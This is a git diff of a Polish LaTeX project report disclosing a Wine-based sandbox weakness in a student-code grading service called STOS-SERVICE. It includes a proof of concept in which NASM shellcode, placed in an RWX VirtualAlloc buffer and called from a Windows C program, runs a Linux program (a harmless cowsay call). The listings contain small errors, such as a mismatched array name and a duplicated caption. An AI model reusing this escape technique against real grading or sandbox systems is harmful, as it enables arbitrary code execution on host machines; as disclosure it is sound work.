@@ -1,4 +1,56 @@
 % LTex: language=pl
 
 \section{Zaadresowanie problemów związanych z bezpieczeństwem systemu (autor: Tymoteusz Paliński)}
-Wine jest chujowym rozwiązaniem i stos jest napisany chujowo. Wyjebać to i napisać na nowo
+Podczas ostatniej iteracji wykryta została krytyczna podatność w funkcjonowaniu istniejącej aplikacji \textit{STOS-SERVICE}. Z racji bardzo ograniczonych zasobów czasowych jak i skomplikowania systemu, eliminacja tych podatności nie była możliwa w ramach obecnego projektu.
+\newline \noindent Pierwsza część podatności leży w samym wykorzystaniu technologii \textit{Wine} do wykonywania dowolnego pliku powstałego na skutek kompilacji kodu przesłanego przez studentów. W artykule na blogu \textit{Pointers to the Void} \cite{wineHack} opisano szereg technik i potencjalnych wektorów ataku na aplikacje działające w ramach \textit{Wine}. Podczas krótkich testów, udało się przeprowadzić pomyślnie atak polegający na uruchomieniu kodu z systemu Linux w aplikacji wykorzystującej API systemu Windows.
+\subsection{Program w assemblerze i kompilacja do kodu maszynowego}
+Aby przeprowadzić wyżej wymieniony atak, pierwszym krokiem jest napisanie aplikacji, która będzie mogła zostać skompilowana bezpośrednio do kodu maszynowego. Najprostszym sposobem na osiągnięcie tego jest wykorzystanie assemblera \textit{x86 64} takiego jak NASM, który będzie w stanie przekształcić prosty kod na kod maszynowy w formacie pliku obiektu \textit{(object file)}, który jest niezbędny w dalszych etapach.
+\lstset{style=asm}
+\begin{lstlisting}[caption = {Przykładowy program napisany w assemblerze na system Linux wywołujący program Cowsay}]
+global _start
+section .data
+cowsay: db "/usr/games/cowsay", 0x0
+args: db "Hey, imagine if someone decided to run reverse shell with this thing", 0x0
+name: db "cowsay", 0x0
+argv: dd name, args, 0x0
+section .text
+_start:
+	; execve
+	mov eax, 11          
+	lea ebx, [cowsay]   
+	lea ecx, [argv]  
+	xor edx, edx
+	int 0x80
+
+	mov eax, 1      
+	xor ebx, ebx         
+	int 0x80
+\end{lstlisting}
+Kod ten można skompilować używając polecenia \textit{nasm -f elf64 -o cowsay.o cowsay.asm}.
+\subsection{Ekstrakcja kodu maszynowego}
+Aby móc wykonać instrukcje umieszczone w programie w języku assembler z poziomu języka C lub C++, należy pozyskać jego treść w formie kodu maszynowego w postaci heksadecymalnej. Można w tym celu skorzystać z narzędzia \textit{hexdump}, aczkolwiek bardziej przydatne w tym celu jest polecenie \textit{xxd}, które przy wykorzystaniu flagi \textit{"i"} automatycznie podaje kod maszynowy pliku w postaci tablicy w języku C.
+\subsection{Wykonanie kodu z poziomu programu w języku C/C++}
+Ostatnim etapem tego ataku jest wywołanie kodu maszynowego z poziomu kodu wykorzystującego API systemu Windows. W tym celu alokowany jest bufor o wielkości tablicy zawierającej kod maszynowy wykonywanego programu, który następnie jest kopiowany do pamięci i wywoływany w postaci funkcji z poziomu języka C.
+\lstset{style=cpp}
+\begin{lstlisting}[caption = {Przykładowy program napisany w assemblerze na system Linux wywołujący program Cowsay}]
+#include <windows.h>
+#include <stdio.h>
+
+unsigned char run_cowsay[] = {
+    // hex dump of asm file
+};
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+{
+    LPVOID exec_buffer = VirtualAlloc(NULL,sizeof(cowsay),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
+    void (*pcode)() = (void(*)())exec_buffer;
+
+    memcpy(exec_buffer,cowsay,sizeof(cowsay));
+    pcode();
+
+
+    return 0;
+}
+\end{lstlisting}
+Powyższy przykład skutkuje jedynie wywołaniem niegroźnego polecenia \textit{cowsay}, lecz potencjalna strona trzecia o bardziej wrogich zamiarach może skorzystać z tego wektora ataku w bardziej drastyczny sposób. 
+\newline \noindent Powyższa podatność w połączeniu z faktem, że kod ten wykonywany jest bezpośrednio na maszynie fizycznej, a nie w kontenerze, jak zakładano podczas wszystkich prócz ostatniej iteracji, prowadzi do krytycznego zagrożenia w kontekście bezpieczeństwa systemu, która powinna być zaadresowana podczas przyszłych prac nad implementacją nowych modułów kompilujących i sprawdzających.
